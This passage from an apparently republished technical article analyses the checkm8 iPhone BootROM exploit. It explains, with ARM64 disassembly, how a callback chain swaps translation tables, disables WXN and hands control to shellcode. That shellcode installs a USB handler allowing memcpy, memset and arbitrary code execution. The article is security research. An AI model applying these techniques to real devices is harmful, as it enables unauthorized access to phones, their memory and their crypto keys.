id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p> Then, interrupts are masked for the atomic execution of further operations. </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> A new value of the table register <code>TTBR0_EL1</code> is set in <code>0x1800B0000</code> . It is the address of <code>INSECURE MEMORY</code> where the exploit's payload is stored. As was mentioned before, the translation descriptors are located at certain offsets in the payload: </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p> The translation table is invalidated in order to translate addresses according to our new translation table. </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64">  5.6 <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p> <code>WXN</code> (Write permission implies Execute-never) is disabled to allow us execute code in <code>RW</code> memory. The execution of the <code>WXN</code> disabling code is possible due to the modified translation table. </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> The original value of the <code>TTBR0_EL1</code> translation register is restored. It is necessary for the correct operation of <code>BootROM</code> during the translation of virtual addresses because the data in <code>INSECURE_MEMORY</code> will be overwritten. </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p> The translation table is reset again. </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p> Interrupt handling is back to normal. </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p> Control is transferred to the initializing <code>shellcode</code> . </p><br><p> Thus, the main task of <code>callback-chain</code> is to disable <code>WXN</code> and transfer control to the <code>shellcode</code> in <code>RW</code> memory. </p><br><h2 id="6-execution-of-shellcode"> 6. Execution of <code>shellcode</code> </h2><br><p> The <code>shellcode</code> is in <code>src/checkm8_arm64.S</code> and does the following: </p><br><h4 id="61-overwriting-usb-configuration-descriptors"> 6.1. Overwriting <code>USB</code> configuration descriptors </h4><br><p> In the global memory, two pointers to configuration descriptors <code>usb_core_hs_configuration_descriptor</code> and <code>usb_core_fs_configuration_descriptor</code> located in the heap are stored. In the third stage, these descriptors were damaged. They are necessary for the correct interaction with a <code>USB</code> device, so the <code>shellcode</code> restores them. </p><br><h4 id="62-changing-usbserialnumber"> 6.2. Changing <code>USBSerialNumber</code> </h4><br><p> A new string descriptor with a serial number is created with a substring <code>" PWND:[checkm8]"</code> added to it. This will help us understand if the exploit was successful. </p><br><h4 id="63-overwriting-the-pointer-of-the-usb-request-handler"> 6.3. Overwriting the pointer of the <code>USB</code> request handler </h4><br><p> The original pointer to the handler of <code>USB</code> requests to the interface is overwritten by a pointer to a new handler, which will be placed in the memory at the next step. </p><br><h4 id="64-copying-usb-request-handler-into-trampoline-memory-area-0x1800afc00"> 6.4. Copying <code>USB</code> request handler into <code>TRAMPOLINE</code> memory area ( <code>0x1800AFC00</code> ) </h4><br><p> Upon receiving a <code>USB</code> request, the new handler checks the <code>wValue</code> of the request against <code>0xffff</code> and if they're not equal, it transfers control back to the original handler. If they are equal, various commands can be executed in the new handlers, like <code>memcpy</code> , <code>memset</code> , and <code>exec</code> (calling an arbitrary address with an arbitrary set of arguments). </p><br><p> Thus, the analysis of the exploit is complete. </p><br><h2 id="the-implementation-of-the-exploit-at-a-lower-level-of-working-with-usb"> The implementation of the exploit at a lower level of working with USB </h2><br><p> As a bonus and an example of the attack at lower levels, we published a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Proof-of-Concept</a> of the <code>checkm8</code> implementation on <code>Arduino</code> with <code>USB Host Shield</code> . The PoC works only for <code>iPhone 7</code> but can be easily ported to other devices. When an <code>iPhone 7</code> in <code>DFU</code> mode is connected to <code>USB Host Shield</code> , all the steps described in this article will be executed, and the device will enter <code>PWND:[checkm8]</code> mode. Then, it can be connected to a PC via <code>USB</code> to work with it using <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ipwndfu</a> (to dump memory, use crypto keys, etc.). This method is more stable than using asynchronous requests with a minimal timeout because we work directly with the <code>USB</code> controller. We used the <a href="">USB_Host_Shield_2.0</a> library. It needs minor modifications; the patch file is also in the repository. </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="in-place-of-a-conclusion"> In place of a conclusion </h2><br><p> Analyzing <code>checkm8</code> was very interesting. We hope that this article will be useful for the community and will motivate new research in this area. The vulnerability will continue to influence the jailbreak community. A jailbreak based on <code>checkm8</code> is already being developed ‚Äî <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">checkra1n</a> , and since the vulnerability is unfixable, it will always work on vulnerable chips ( <code>A5</code> to <code>A11</code> ) regardless of the iOS version. Plus, there are many vulnerable devices, like <code>iWatch</code> , <code>Apple TV</code> , etc. We expect more interesting projects for Apple devices to come. </p><br><p> Besides jailbreak, this vulnerability will also influence the researchers of Apple devices. With <code>checkm8</code> , you can already boot <code>iOS</code> devices in verbose mode, dump <code>SecureROM</code> , or use the <code>GID</code> key to decrypt firmware images. Although, the most interesting application for this exploit would be entering debug mode on vulnerable devices with <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">a special JTAG/SWD cable</a> . Before that, it could only be done with special prototypes that are <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">extremely hard to get</a> or with the help of <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">special services</a> . Thus, with <code>checkm8</code> , <code>Apple</code> research becomes way easier and cheaper. </p><br><h2 id="references"> References </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">an ipwndfu fork from LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt472762/">https://habr.com/ru/post/pt472762/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt472750/index.html">OK, eu realmente preciso do Kubernetes?</a></li>
<li><a href="../pt472752/index.html">CSE: Kubernetes para qualquer pessoa no vCloud</a></li>
<li><a href="../pt472754/index.html">Como falar ingl√™s em um m√™s. 9 etapas f√°ceis e comprovadas</a></li>
<li><a href="../pt472758/index.html">Proposta: try - fun√ß√£o de verifica√ß√£o de erro integrada</a></li>
<li><a href="../pt472760/index.html">Reduza o tempo de computa√ß√£o de alguns anos para minutos. Compreendendo o aprendizado de m√°quina qu√¢ntica</a></li>
<li><a href="../pt472766/index.html">Parametriza√ß√£o do arquivo em py.test</a></li>
<li><a href="../pt472768/index.html">Como contratar, demitir e retornar da ger√™ncia ao desenvolvimento: v√≠deo do Badoo Techleads Meetup # 5</a></li>
<li><a href="../pt472770/index.html">Organiza√ß√£o da interface no Unity com UI Canvas</a></li>
<li><a href="../pt472772/index.html">Pesquise incidentes e reivindica√ß√µes semelhantes. M√©tricas e Otimiza√ß√£o</a></li>
<li><a href="../pt472776/index.html">Backup Parte 7: Conclus√µes</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>